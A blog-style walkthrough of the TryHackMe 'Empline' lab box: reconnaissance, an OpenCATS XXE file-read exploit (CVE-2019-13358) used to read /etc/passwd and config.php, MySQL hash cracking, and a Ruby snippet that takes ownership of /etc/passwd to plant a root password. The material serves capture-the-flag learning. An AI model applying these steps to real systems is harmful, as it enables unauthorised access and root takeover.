---
layout: post
title:  "TryHackMe - Empline - Writeup!"
date:   2021-09-25 00:06:59
categories: thm
---


# [Empline](https://tryhackme.com/room/Emplineeasy) - 

<hr>


![Empline](/assets/thm/empline/empline.png)

---
<br>

### NMAP

First `nmap -sCV 10.10.34.213` run didn't give much ports. Second more wide one has found high port that has `SSH` running on.

{% highlight bash startinline=true %}

# nmap -sSCV $ip
Starting Nmap 7.60 ( https://nmap.org ) at 2021-09-25 00:58 BST
Nmap scan report for ip-10-10-173-75.eu-west-1.compute.internal (10.10.173.75)
Host is up (0.0023s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c0:d5:41:ee:a4:d0:83:0c:97:0d:75:cc:7b:10:7f:76 (RSA)
|   256 83:82:f9:69:19:7d:0d:5c:53:65:d5:54:f6:45:db:74 (ECDSA)
|_  256 4f:91:3e:8b:69:69:09:70:0e:82:26:28:5c:84:71:c9 (EdDSA)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Empline
3306/tcp open  mysql   MySQL 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
|   Thread ID: 85
|   Capabilities flags: 63487
|   Some Capabilities: SupportsTransactions, Speaks41ProtocolNew, Support41Auth, LongColumnFlag, SupportsLoadDataLocal, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, InteractiveClient, LongPassword, SupportsCompression, ODBCClient, Speaks41ProtocolOld, FoundRows, ConnectWithDatabase, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: N7exKM~Ti3ap/5^Y&O:s
|_  Auth Plugin Name: 111
MAC Address: 02:49:05:D9:3C:87 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.48 seconds

{% endhighlight %}

### GOBUSTER
---
<br>
Found interesting page that has usernames on it.
{% highlight bash startinline=true %}
root@ip-10-10-104-51:~# gobuster dir -u http://$ip -w /usr/share/wordlists/dirb/common.txt -e 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.173.75
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/09/25 01:06:13 Starting gobuster
===============================================================
http://10.10.173.75/.hta (Status: 403)
http://10.10.173.75/.htpasswd (Status: 403)
http://10.10.173.75/assets (Status: 301)
http://10.10.173.75/.htaccess (Status: 403)
http://10.10.173.75/index.html (Status: 200)
http://10.10.173.75/javascript (Status: 301)
http://10.10.173.75/server-status (Status: 403)
===============================================================
2021/09/25 01:06:16 Finished
===============================================================

{% endhighlight %}

Checking this has gave nothing...

#### Check the Page source 
![Empline](/assets/thm/empline/found_domain.png)

Image of the source goes header
#### Add it to the Hosts file
![Empline](/assets/thm/empline/add_domain_to_hosts.png)

#### Gobuster part two


<hr>
<br>
One of the pages from `Gobuster` helped find them.
{% highlight bash startinline=true %}
root@ip-10-10-104-51:~# gobuster dir -u http://job.empline.thm/ -w /usr/share/wordlists/dirb/common.txt -e 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://job.empline.thm/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/09/25 01:17:11 Starting gobuster
===============================================================
http://job.empline.thm/.hta (Status: 403)
http://job.empline.thm/.htaccess (Status: 403)
http://job.empline.thm/.htpasswd (Status: 403)
http://job.empline.thm/ajax (Status: 301)
http://job.empline.thm/attachments (Status: 301)
http://job.empline.thm/careers (Status: 301)
http://job.empline.thm/ckeditor (Status: 301)
http://job.empline.thm/db (Status: 301)
http://job.empline.thm/images (Status: 301)
http://job.empline.thm/javascript (Status: 301)
http://job.empline.thm/js (Status: 301)
http://job.empline.thm/lib (Status: 301)
http://job.empline.thm/modules (Status: 301)
http://job.empline.thm/index.php (Status: 200)
http://job.empline.thm/rss (Status: 301)
http://job.empline.thm/scripts (Status: 301)
http://job.empline.thm/server-status (Status: 403)
http://job.empline.thm/src (Status: 301)
http://job.empline.thm/temp (Status: 301)
http://job.empline.thm/test (Status: 301)
http://job.empline.thm/upload (Status: 301)
http://job.empline.thm/vendor (Status: 301)
http://job.empline.thm/wsdl (Status: 301)
http://job.empline.thm/xml (Status: 301)
{% endhighlight %}


#### Opencats ...

Checklist 

- [ ] Version
- [ ] Vulnerabilities
- [ ] PoC

#### Version
![Empline](/assets/thm/empline/opencats_version.png)


#### Vulnerability
![Empline](/assets/thm/empline/opencats_vuln_cve.png)
<br><br>

there were some links to check 
<br>
<br>
![Empline](/assets/thm/empline/opencats_poc_links.png)


#### PoC
There is a code on `ExploitDB`
![Empline](/assets/thm/empline/exploitdb_code.png)

But... it was not working for me.
{% highlight bash startinline=true %}
 python 50316.py --url job.empline.thm --file /etc/passwd
 
 http://job.empline.thm/careers/index.php
Traceback (most recent call last):
  File "50316.py", line 114, in post
    request = requests.post(self.args.url, params=params, files=files)
  File "/usr/lib/python3/dist-packages/requests/api.py", line 112, in post
    return request('post', url, data=data, json=json, **kwargs)
  File "/usr/lib/python3/dist-packages/requests/api.py", line 58, in request
    return session.request(method=method, url=url, **kwargs)
  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 506, in request
    prep = self.prepare_request(req)
  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 449, in prepare_request
    hooks=merge_hooks(request.hooks, self.hooks),
  File "/usr/lib/python3/dist-packages/requests/models.py", line 308, in prepare
    self.prepare_body(data, files, json)
  File "/usr/lib/python3/dist-packages/requests/models.py", line 496, in prepare_body
    (body, content_type) = self._encode_files(files, data)
  File "/usr/lib/python3/dist-packages/requests/models.py", line 159, in _encode_files
    fdata = fp.read()
AttributeError: 'int' object has no attribute 'read'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "50316.py", line 140, in <module>
    CVE_2019_13358().run()
  File "50316.py", line 138, in run
    self.post(id)
  File "50316.py", line 118, in post
    raise Exception("Failed to POST to the URL provided", e)
Exception: ('Failed to POST to the URL provided', AttributeError("'int' object has no attribute 'read'",))
{% endhighlight %}

Mixed first link with the second one, code from the first link (same code on ExploitDB) generated DOCX (read source code to see the directory) for the upload, so I went after the second link `doddsecurity` and found missing component, Upload button for the CV.

![Empline](/assets/thm/empline/opencats_upload_cv.png)

Learning the code that I had downloaded from `ExploitDB`,  there were lines
![Empline](/assets/thm/empline/opencats_start_end.png)

There is a clear identification of the Base64 line between those words. Using [Cyber Chef](https://gchq.github.io/CyberChef/) to decode this line.

#### User flag
Now that I have ability read files, let's read the `config.php` that has username and password of the Opencats, I've learnt it from the github page [Opencats](https://github.com/opencats/OpenCATS).

![Empline](/assets/thm/empline/opencats_base64_config.png)

 (Didn't go so well at the first time...) One of the listed CVE's gave me the idea to connect via MySQL to the machine.

![Empline](/assets/thm/empline/opencats_not_cve.png)
#### MySQL
Connection command
{% highlight bash startinline=true %}
$ mysql -u user -p -h <ip>
{% endhighlight %}

![Empline](/assets/thm/empline/mysql_users_passwords.png)

and let's check them on the Crackstation

![Empline](/assets/thm/empline/new_hashes.png)

got new User password

### George has user.txt
Has no permission for nothing, so I've uploaded linPEAC and there were I lost the directions... but then



### PRIV_ESC
***
<br>
![Empline](/assets/thm/empline/linpeak_priv_esc.png)

`irb` did not work for me, so I just wrote little code that is changing owner ship of the `/etc/passwd`

{% highlight ruby startinline=true %}
#!/usr/local/bin/ruby

# File.chown(Owner_id, Group_id, file)
File.chown(1002,1002, "/etc/passwd")
{% endhighlight %}

Some files manipulations.

![Empline](/assets/thm/empline/change_own.png)

This has changed the owner and group of the `/etc/passwd` file, generated new password for User root with `openssl passwd -1` command.

![Empline](/assets/thm/empline/change_passwd_root.png)

Edit the `/etc/passwd` file with newly created password and login with `root`.


#### Root (Done this Box)
***

![Empline](/assets/thm/empline/rooted_fin.png)